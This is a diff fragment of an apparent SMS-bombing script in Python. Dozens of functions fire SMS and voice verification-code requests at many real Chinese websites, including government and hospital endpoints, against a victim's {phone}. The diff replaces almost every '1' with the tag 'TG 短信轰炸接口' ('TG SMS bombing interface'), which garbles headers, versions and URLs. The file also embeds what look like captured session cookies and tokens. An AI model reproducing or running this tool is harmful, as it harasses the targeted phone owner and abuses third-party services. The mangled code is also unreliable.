         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "*/*",
@@ -1189,9 +1189,9 @@ def request_url44():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "delivery-store-id": "1648354775180",
         "Content-Type": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "api-version": "0.0.5",
-        "app-version": "wxapp-3.1.45",
+        "app-version": "wxapp-3.TG 短信轰炸接口.45",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
         "Sec-Fetch-Mode": "cors",
@@ -1218,9 +1218,9 @@ def request_url45():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "WCToken": "100240366335%2CtBMwYGFsn%2BlVqrxv2qna1XpghCNKlMz1lChtTq7W4RFw6%2BU7WHIDBTLhLDo9OMPzb6rpW0EDJ9dU3ZugwHrUzp82IkXOjzA1lTGNVBkX7DR2q7lYVjXaQA1u6NHX%2BKhrhp%2FxCi6GIF651l4L5VkL1CRekO6WfZ2aJUOvi0rA57ZiFyurTvAi%2Bh4TL3UQTdLCLQIbJ46bLsmbQFzpB5qnVvjuPGbV1q6wLjBnLdkSkUgmO1czuQumbu%2BM%2BAQ2i4VR",
         "Content-Type": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "userId": "100240366335",
-        "Cookie": "ITXSESSIONID=430432c696c6131368ccd9620151d413; ITXDEVICEID=a9284b4ce3afc90a016fa711c48288a1; IDROSTA=0b77996b5a86:32a914adaff7c6c9fb2b8233d; _abck=1B3AE95117673B9C8CB1ACC89C340C70~-1~YAAQFAWK3qB6eTaOAQAA+DokfwuEW2bTVIIFrymGc6tbIFh8WRyufdH0e0Peo2qrO7VagICwx8wMHFTAG+8bkJy+krieYYFBNcw1hpenGxFnXV6Y/q5utsBzLVy3JuYr7JN0vWdKyFSow69/GYN9i+QGBV7Hvmyf+0+rgIlGsCTWJCReZpziznutoQN33xORc6CaYA3UZc/4xixP6OBTcfR6tsU5C0no8BdbPEo8If1MVgE3sgguJjfSCAWm9yc5sVl5QvZTplp6zF9Cu54QTYYlR0Zs2ywwjEK/ZSScDixvK9U2gmBVGF2snddrsxi9olr0uVMy+yYoZupZha/7ySeRVKfz/kXO6UlDnBNFDciZzmw2gg;JSESSIONID=0000Me_t-Egf2Zj4W3DqjLBVw7-:3aa4aakdv; ITXSESSIONID=430432c696c6131368ccd9620151d413;__mgjuuid=736d90cf-59d4-4016-a462-9323b90d6a1e; bm_sz=3EF6893EDCB93926B93E43151002DC11~YAAQDgWK3uj02zWOAQAAoFgjfxeSyS12EW/VkWXPf0kh8k7ADct2iIktIYfj6AYdZzYLN7+JPb1gHG15nk7txm/A+m8nYOgChvTi0wlHwe78sb/GdcnXOnyIUG2OjaUboiMB0gIfpbvUsqiP3nYTm4dYO3sC+tE5TAlluXsx7QRtNv/QzMUYZc35qXQ2pfoeVS+fNDdEcwzmrJzCBgk5vkhULnR2EAt1oWWDvEZtN9gidAFrUqA+pAzM3lUNCgrhIChz3e+TdKJ6lt5x+pXwPH+FTWDdZd0V6Fwmi1LVs6q+ckzeZGfXcQNsIAPmOwe9DCXPEh+ooH9CwXNxk58JH8u03WaQYffQIyyGH7QodhTl74",
+        "Cookie": "ITXSESSIONID=430432c696c6131368ccd9620151d413; ITXDEVICEID=a9284b4ce3afc90a016fa711c48288a1; IDROSTA=0b77996b5a86:32a914adaff7c6c9fb2b8233d; _abck=1B3AE95117673B9C8CB1ACC89C340C70~-TG 短信轰炸接口~YAAQFAWK3qB6eTaOAQAA+DokfwuEW2bTVIIFrymGc6tbIFh8WRyufdH0e0Peo2qrO7VagICwx8wMHFTAG+8bkJy+krieYYFBNcw1hpenGxFnXV6Y/q5utsBzLVy3JuYr7JN0vWdKyFSow69/GYN9i+QGBV7Hvmyf+0+rgIlGsCTWJCReZpziznutoQN33xORc6CaYA3UZc/4xixP6OBTcfR6tsU5C0no8BdbPEo8If1MVgE3sgguJjfSCAWm9yc5sVl5QvZTplp6zF9Cu54QTYYlR0Zs2ywwjEK/ZSScDixvK9U2gmBVGF2snddrsxi9olr0uVMy+yYoZupZha/7ySeRVKfz/kXO6UlDnBNFDciZzmw2gg;JSESSIONID=0000Me_t-Egf2Zj4W3DqjLBVw7-:3aa4aakdv; ITXSESSIONID=430432c696c6131368ccd9620151d413;__mgjuuid=736d90cf-59d4-4016-a462-9323b90d6a1e; bm_sz=3EF6893EDCB93926B93E43151002DC11~YAAQDgWK3uj02zWOAQAAoFgjfxeSyS12EW/VkWXPf0kh8k7ADct2iIktIYfj6AYdZzYLN7+JPb1gHG15nk7txm/A+m8nYOgChvTi0wlHwe78sb/GdcnXOnyIUG2OjaUboiMB0gIfpbvUsqiP3nYTm4dYO3sC+tE5TAlluXsx7QRtNv/QzMUYZc35qXQ2pfoeVS+fNDdEcwzmrJzCBgk5vkhULnR2EAt1oWWDvEZtN9gidAFrUqA+pAzM3lUNCgrhIChz3e+TdKJ6lt5x+pXwPH+FTWDdZd0V6Fwmi1LVs6q+ckzeZGfXcQNsIAPmOwe9DCXPEh+ooH9CwXNxk58JH8u03WaQYffQIyyGH7QodhTl74",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
         "Sec-Fetch-Mode": "cors",
@@ -1242,7 +1242,7 @@ def request_url46():
         "Host": "xiaoshou.lujiandairy.com",
         "Connection": "keep-alive",
         "Content-Length": "24",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "role": "",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "token": "",
@@ -1269,7 +1269,7 @@ def request_url47():
         "Connection": "keep-alive",
         "Content-Length": "136",
         "W-Token": "4276",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "U-Token": "",
         "AppId-Token": "wx942a1bf556cf82ed",
         "Uni-Code": "633f39b271e585b3ed3af77237320e21",
@@ -1304,7 +1304,7 @@ def request_url48():
         "Host": "api.jmfww.com",
         "Connection": "keep-alive",
         "Content-Length": "25",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "Authorization": "Bearer",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/x-www-form-urlencoded",
@@ -1329,7 +1329,7 @@ def request_url49():
         "Host": "ehospital-members.sq580.com",
         "Connection": "keep-alive",
         "Content-Length": "23",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "token": "",
         "Content-Type": "application/json",
@@ -1355,7 +1355,7 @@ def request_url50():
         "Connection": "keep-alive",
         "Content-Length": "450",
         "Accept": "application/json, text/plain, */*",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
         "Sec-Fetch-Site": "cross-site",
@@ -1379,8 +1379,8 @@ def request_url50():
         "deviceId": "04daccefc14033ed3d18f157a9f6d1d8",
         "signType": "MD5",
         "termType": "WX_MINI",
-        "version": "1.0.0",
-        "appVersion": "1.0.0",
+        "version": "TG 短信轰炸接口.0.0",
+        "appVersion": "TG 短信轰炸接口.0.0",
         "termId": "1234",
         "alg": "AES",
         "sign": "rasfs2334214fasf",
@@ -1400,9 +1400,9 @@ def request_url51():
         "Host": "homedoctor.grdoc.org",
         "Connection": "keep-alive",
         "Content-Length": "126",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
-        "client": "windows-applet-1.0.0",
+        "client": "windows-applet-TG 短信轰炸接口.0.0",
         "token": "69052a2a113affd66a7fb294ec6cb2221ac8ba430ebf1ea1572317fc898772d4",
         "Content-Type": "application/json",
         "Accept": "*/*",
@@ -1502,7 +1502,7 @@ def request_url63():
         "Content-Type": "application/x-www-form-urlencoded",
         "ddmc-device-id": "osP8I0awRCC_O1WiPSvhuWwJTAD4",
         "ddmc-uid": "",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "ddmc-app-client-id": "4",
         "ddmc-station-id": "5500fe01916edfe0738b4e43",
         "ddmc-oc": "99.99999999999999,888.88888888888888",
@@ -1541,7 +1541,7 @@ def request_url63():
 
 
 def request_url64():
-    url64 = f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={phone}&type=1"
+    url64 = f"https://gateway.zhiniu.com/zucenter-server/user/getSmsCode?telephone={phone}&type=TG 短信轰炸接口"
     response64 = requests.get(url64)
 
 
@@ -1551,12 +1551,12 @@ def request_url65():
 
 
 def request_url66():
-    url66 = f"https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno={phone}&checkdup=1&areaid=&rolecode=TJKS"
+    url66 = f"https://clgl.cadc.net.cn/api/Base/GetSmsCheckcode?telno={phone}&checkdup=TG 短信轰炸接口&areaid=&rolecode=TJKS"
     response66 = requests.get(url66)
 
 
 def request_url67():
-    url67 = f"https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile={phone}&code=&checkNotFlag=1"
+    url67 = f"https://www.pinganbinzhong.com/mpmt-user/login/validateCode?mobile={phone}&code=&checkNotFlag=TG 短信轰炸接口"
     response67 = requests.get(url67)
 
 
@@ -1596,7 +1596,7 @@ def request_url74():
 
 
 def request_url75():
-    url75 = f"https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum={phone}&corName=egova&isJsonp=1&cityCode=100&terminalID=7&access_token=&token="
+    url75 = f"https://cgj.lasa.gov.cn/eGovaPublic/mi/app/sendidentifycode?phoneNum={phone}&corName=egova&isJsonp=TG 短信轰炸接口&cityCode=100&terminalID=7&access_token=&token="
     response75 = requests.get(url75)
 
 
@@ -1621,7 +1621,7 @@ def request_url79():
 
 
 def request_url80():
-    url80 = f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=1&use_type=1"
+    url80 = f"https://jdapi.jd100.com/uc/v1/getSMSCode?account={phone}&sign_type=TG 短信轰炸接口&use_type=TG 短信轰炸接口"
     response80 = requests.get(url80)
 
 
@@ -1656,12 +1656,12 @@ def request_url86():
 
 
 def request_url87():
-    url87 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
+    url87 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=TG 短信轰炸接口"
     response87 = requests.get(url87)
 
 
 def request_url88():
-    url88 = f"https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
+    url88 = f"https://gemini.minxundianzi.com/marsplan/mars/user/sendSmsCode?countryCode=86&userTel={phone}&type=TG 短信轰炸接口"
     response88 = requests.get(url88)
 
 
@@ -1701,7 +1701,7 @@ def request_url95():
 
 
 def request_url96():
-    url96 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=1"
+    url96 = f"https://great.minxundianzi.com/greatweb/great/user/sendSmsCode?countryCode=86&userTel={phone}&type=TG 短信轰炸接口"
     response96 = requests.get(url96)
 
 
@@ -1792,7 +1792,7 @@ def request_url114():
         "Connection": "keep-alive",
         "Content-Length": "17",
         "scene": "pzt_weixin_0.0.116",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "checkSumDTO": '{"appid":"20200924001","nonce":"554360341071","curtime":"1712223908000","checksum":"a9ed7bdc8734b150333b59ca005d62082074365f"}',
         "appid": "wx4d68f497875d7e2c",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
@@ -1818,7 +1818,7 @@ def request_url115():
         "Content-Length": "17",
         "scene": "pzt_weixin_0.0.116",
         "system": '{"model":"microsoft","appName":"wxe1f61a425eaae0b8","system":"Windows 10 x64"}',
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "appid": "wx86f84c798cfb9a6b",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
@@ -1841,8 +1841,8 @@ def request_url116():
         "Host": "m.midea.cn",
         "Connection": "keep-alive",
         "Content-Length": "38",
-        "X-Wx-Version": "3.9.6/3.4.1",
-        "xweb_xhr": "1",
+        "X-Wx-Version": "3.9.6/3.4.TG 短信轰炸接口",
+        "xweb_xhr": "TG 短信轰炸接口",
         "X-Wx-Appid": "wxa13e96304985b75d",
         "Cookie": "midea_mk=486649a8b67c920c3134dd81ed1e3aa;plt=wxsapp;appname=weapp_fx_r",
         "X-Wx-Ref": "pages/login/login",
@@ -1868,7 +1868,7 @@ def request_url117():
         "Connection": "keep-alive",
         "Content-Length": "49",
         "mini-type": "miniLife",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "mini-version": "2.4.5",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309092b)XWEB/8461",
         "sign": "QKwUegAfSGGrcQyas7TsB4uCP78=",
@@ -1929,7 +1929,7 @@ def request_url121():
         "Sec-Fetch-Mode": "cors",
         "Content-Type": "application/json;charset=utf-8",
         "Origin": "https://wap.duoyou.com",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.TG 短信轰炸接口",
         "Referer": "https://wap.duoyou.com/",
         "Connection": "keep-alive",
         "Sec-Fetch-Dest": "empty"
@@ -1954,7 +1954,7 @@ def request_url122():
         "Authorization": "Basic QTFDQ0FFOUItNjcwMi0wOUY4LTVDNjUtOTM3M0ZEQkY4OTY4OjNhYzcxNjk2OGM0NzlmMmMzZTVhYjc1MjQ2OTYyMWJi",
         "Content-Type": "application/x-www-form-urlencoded",
         "Accept": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "X-Requested-With": "XMLHttpRequest",
         "token": "",
         "Sec-Fetch-Site": "cross-site",
@@ -1984,10 +1984,10 @@ def request_url123():
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "X-WX-Model": "microsoft",
         "Content-Type": "application/x-www-form-urlencoded",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "X-Requested-With": "XMLHttpRequest",
         "Cookie": "connect.sid=s:jvqIK7Zaee0wu5JbSuZZ8sDhjMo3IR0f.b0SnJDCKgOHw2fmQVXxjPzQpLNRk%2B8HWTj3o2LX1BU0",
-        "version": "89.1.0",
+        "version": "89.TG 短信轰炸接口.0",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
         "Sec-Fetch-Mode": "cors",
@@ -2018,7 +2018,7 @@ def request_url124():
         "X-msale-platform": "SP",
         "X-msale-code": "MM",
         "X-msale-way": "AMM",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "X-source": "SPG",
         "X-chain-id": "",
         "Accept": "*/*",
@@ -2043,7 +2043,7 @@ def request_url125():
         "Host": "api.cdfsunrise.com",
         "Connection": "keep-alive",
         "Content-Length": "214",
-        "AppVersion": "1.29.6",
+        "AppVersion": "TG 短信轰炸接口.29.6",
         "MiniApp": "weapp",
         "mobile": "",
         "showLoading": "[object Boolean]",
@@ -2060,7 +2060,7 @@ def request_url125():
         "Referrer-Policy": "origin",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
         "Content-Type": "application/json;charset=UTF-8",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "alipayopenid": "",
         "deviceModel": "microsoft",
         "Accept": "*/*",
@@ -2089,7 +2089,7 @@ def request_url126():
         "Host": "vipainisheng.com",
         "Connection": "keep-alive",
         "Content-Length": "302",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "loginDevictType": "XCX",
         "cookie": "",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9105",
@@ -2104,7 +2104,7 @@ def request_url126():
     }
     data126 = {
         "jmxygtz": "",
-        "vcVersionCode": "1.6.2",
+        "vcVersionCode": "TG 短信轰炸接口.6.2",
         "language": "zh_CN",
         "loginDevictType": "XCX",
         "appCode": "JS",
@@ -2134,7 +2134,7 @@ def request_url127():
         "Content-Type": "application/json",
         "Accept": "application/json",
         "cache-control": "no-cache",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "x-requested-with": "XMLHttpRequest",
         "cookie": "acw_tc=0b6e702e17131629263394156e104b9681bb7f7854d38d5dfc0dff560ade54; guestId=01e7996e-454f-4bab-bd84-44b6d2277113; 15 Apr 2025 06:35:26 GMT; guestId.sig=jWFSrGBOhFwEfFZJbEoMSYkDoO8; 15 Apr 2025 06:35:50 GMT; 15 Apr 2025 06:35:52 GMT",
         "Sec-Fetch-Site": "cross-site",
@@ -2154,7 +2154,7 @@ def request_url127():
 
 
 def request_url128():
-    url128 = f"https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86{phone}&appCont=1"
+    url128 = f"https://user.yunjiglobal.com/yunjiuserapp/userapp/generateVoiceSmsCode.json?phone=86{phone}&appCont=TG 短信轰炸接口"
     response128 = requests.get(url128)
 
 
@@ -2169,9 +2169,9 @@ def request_url129():
         "houseId": "",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF WindowsWechat(0x6309062b) XWEB/9079",
         "Content-Type": "application/json",
-        "xweb_xhr": "1",
+        "xweb_xhr": "TG 短信轰炸接口",
         "neighNo": "",
-        "version": "1.4.6",
+        "version": "TG 短信轰炸接口.4.6",
         "Accept": "*/*",
         "Sec-Fetch-Site": "cross-site",
         "Sec-Fetch-Mode": "cors",
@@ -2192,7 +2192,7 @@ def request_url130():
 
 
 def request_url131():
-    url131 = "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone={phone}&smstype=1"
+    url131 = "https://igetcool-gateway.igetcool.com/app-api-user-server/white/sms/voice.json?phone={phone}&smstype=TG 短信轰炸接口"
     response131 = requests.get(url131)
 
 
@@ -2208,11 +2208,11 @@ def request_url133():
         'Content-Type': 'application/x-www-form-urlencoded',
         'Accept': 'application/json',
         'Connection': 'keep-alive',
-        'Platform': '1',
-        'Models': 'iPhone12,1',
+        'Platform': 'TG 短信轰炸接口',
+        'Models': 'iPhone12,TG 短信轰炸接口',
         'Version': '2.8.7',
-        'User-Agent': 'dingdongzuwu/2.8.7 (iPhone; iOS 16.6.1; Scale/2.00)',
-        'Accept-Language': 'zh-Hans-CN;q=1',
+        'User-Agent': 'dingdongzuwu/2.8.7 (iPhone; iOS 16.6.TG 短信轰炸接口; Scale/2.00)',
+        'Accept-Language': 'zh-Hans-CN;q=TG 短信轰炸接口',
         'Accept-Encoding': 'gzip, deflate, br'
     }
 
@@ -2226,13 +2226,13 @@ def request_url134():
     headers134 = {
         'Host': 'api.boxtrip.vip',
         'Accept': '*/*',
-        'version': '1.2.4',
+        'version': 'TG 短信轰炸接口.2.4',
         'Accept-Encoding': 'gzip, deflate, br',
         'Accept-Language': 'zh-CN,zh-Hans;q=0.9',
         'platform': 'ios',
         'signature': '2143352315',
         'Content-Length': '24',
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app',
         'Connection': 'keep-alive',
         'Content-Type': 'application/json',
         'deviceBrand': 'iphone'
@@ -2252,8 +2252,8 @@ def request_url135():
         'Accept-Encoding': 'gzip, deflate, br',
         'Connection': 'keep-alive',
         'market': '8',
-        'isapp': '1',
-        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app',
+        'isapp': 'TG 短信轰炸接口',
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app',
         'autograph': '',
         'Content-Length': '23',
         'Accept-Language': 'zh-CN,zh-Hans;q=0.9'
@@ -2272,7 +2272,7 @@ def request_url136():
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Accept": "*/*",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Content-Length": "33",
         "token": "",
         "Accept-Language": "zh-CN,zh-Hans;q=0.9"
@@ -2292,7 +2292,7 @@ def request_url137():
         "Content-Type": "application/json",
         "Connection": "keep-alive",
         "Accept": "*/*",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Content-Length": "24",
         "Accept-Language": "zh-CN,zh-Hans;q=0.9",
         "Accept-Encoding": "gzip, deflate, br"
@@ -2311,7 +2311,7 @@ def request_url138():
         "Content-Type": "application/json;charset=UTF-8",
         "Connection": "keep-alive",
         "Accept": "*/*",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Content-Length": "21",
         "Accept-Language": "zh-CN,zh-Hans;q=0.9",
         "Accept-Encoding": "gzip, deflate, br"
@@ -2336,7 +2336,7 @@ def request_url139():
         "platform": "APP",
         "Content-Type": "application/json;charset=UTF-8",
         "Content-Length": "23",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Connection": "keep-alive"
     }
     data139 = {
@@ -2354,7 +2354,7 @@ def request_url140():
         "Accept-Encoding": "gzip, deflate, br",
         "Connection": "keep-alive",
         "Accept": "application/json",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Authorization": "bearer undefined",
         "Content-Length": "58",
         "Accept-Language": "zh-CN,zh-Hans;q=0.9"
@@ -2376,8 +2376,8 @@ def request_url141():
         "Content-Type": "application/json",
         "Connection": "keep-alive",
         "Accept": "*/*",
-        "User-Agent": "HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.1; Scale/2.00)",
-        "Accept-Language": "zh-Hans-CN;q=1",
+        "User-Agent": "HZCitizenCardapp/6.7.6 (iPhone; iOS 16.6.TG 短信轰炸接口; Scale/2.00)",
+        "Accept-Language": "zh-Hans-CN;q=TG 短信轰炸接口",
         "Content-Length": "39",
         "Accept-Encoding": "gzip, deflate, br"
     }
@@ -2402,13 +2402,13 @@ def request_url142():
         "signature": "a4ae58d89f0df0e7166be4371c0b2d944f4699d9",
         "Content-Type": "application/json",
         "Content-Length": "47",
-        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/1.0 (Immersed/44) uni-app",
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.TG 短信轰炸接口.15 (KHTML, like Gecko) Mobile/15E148 Html5Plus/TG 短信轰炸接口.0 (Immersed/44) uni-app",
         "Connection": "keep-alive"
     }
     data142 = {
         "is_test": 0,
         "mobile": phone,
-        "type": "1"
